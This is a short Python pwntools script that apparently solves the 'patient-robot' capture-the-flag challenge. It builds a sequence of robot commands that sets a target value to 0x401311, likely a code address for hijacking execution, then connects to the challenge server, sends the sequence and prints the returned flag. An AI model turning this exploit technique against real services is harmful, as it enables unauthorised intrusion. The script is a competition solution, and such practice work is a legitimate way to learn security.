#!/usr/bin/env python3
import time

from pwn import *

OR_COMMAND = "DOOP"
SLEEP_COMMAND = "BOOP"
SHIFT_COMMAND = "BEEP"
OR_VAL = 0x800000

command = OR_COMMAND
val = 0x800000
command += SHIFT_COMMAND * 4
val >>= 4
command += SLEEP_COMMAND + OR_COMMAND
val |= OR_VAL
command += SHIFT_COMMAND * 4
val >>= 4
command += SLEEP_COMMAND + OR_COMMAND
val |= OR_VAL
command += SHIFT_COMMAND
val >>= 1
command += SLEEP_COMMAND + OR_COMMAND
val |= OR_VAL
command += SHIFT_COMMAND * 3
val >>= 3
command += SLEEP_COMMAND + OR_COMMAND
val |= OR_VAL
command += SHIFT_COMMAND * 10
val >>= 10
command += SLEEP_COMMAND + OR_COMMAND
val |= OR_VAL
command += SHIFT_COMMAND
val >>= 1

assert val == 0x401311

print("Command:", command)

now = time.time()
seconds = int(now % 60)
tenths = seconds // 10

if tenths % 2 == 0:
    print("Tenths are even, sleeping for 10 seconds")
    time.sleep(10.0)

p = remote(
    "spaceheroes-patient-robot.chals.io",
    443,
    ssl=True,
    sni="spaceheroes-patient-robot.chals.io",
)

p.recvuntil(b"BEEP-BOOP-DOOP!\n")
p.sendline(command.encode())
flag = p.recvall()
if flag is None:
    print("No flag received")
else:
    print(flag.decode())
